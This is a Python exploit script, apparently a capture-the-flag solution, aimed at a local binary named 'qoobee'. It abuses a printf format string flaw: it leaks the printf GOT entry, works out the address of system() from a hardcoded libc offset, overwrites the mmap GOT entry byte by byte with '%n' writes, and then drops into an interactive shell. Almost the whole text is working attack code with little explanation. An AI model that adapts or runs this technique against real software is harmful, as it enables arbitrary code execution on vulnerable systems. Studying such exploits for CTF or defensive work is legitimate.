'''
printf format string attack
not patched
'''

from libformatstr import *
from zio import *
import struct

io = zio('./qoobee',timeout=8000000,print_write=COLORED(REPR))

# replaced function
printf_got_plt = 0x0804B74C
mmap_got_plt = 0x0804B77C

# in my system
# printf      0x0004d1f0
# system  0x00040100
offset_printf_system = -0xd0f0

def leak_dword(addr):
    io.writeline('1')
    io.writeline('1')
    io.writeline(str(addr))
    io.writeline('%.4s')
    io.writeline('2')
    io.read_until('Description: ')
    plt = io.read(4)
    log('addr %08x:%s' % (addr,hex(struct.unpack('<I', plt)[0])), color='red')
    return plt

def get_printf_addr():
    rst = struct.unpack('<I',leak_dword(printf_got_plt))[0]
    log('printf_plt:%s' % hex(rst), color='red')
    return rst

def set_dword(addr, dword):
    if dword == 0:
        payload = '%n'
    else:
        payload = '%0'+str(dword)+'x'+'%1$n'
    io.writeline('1')
    io.writeline('1')
    io.writeline(str(addr))
    io.writeline(payload)
    io.writeline('2')

if __name__ == '__main__':
    io.writeline('-214')
    io.writeline('sh')
    got_plt = ""
    printf_plt = get_printf_addr()
    system_addr = printf_plt + offset_printf_system
    got_plt += l32(system_addr)
    log('system_addr:%s' % hex(system_addr), color='red')
    io.gdb_hint()
    i = 0
    for c in got_plt:
        log('set %02x:%u' % (ord(c),struct.unpack('<B', c)[0]), color='red')
        set_dword(mmap_got_plt+i, struct.unpack('<B', c)[0])
        i += 1
    io.writeline('-214')
    io.interact()
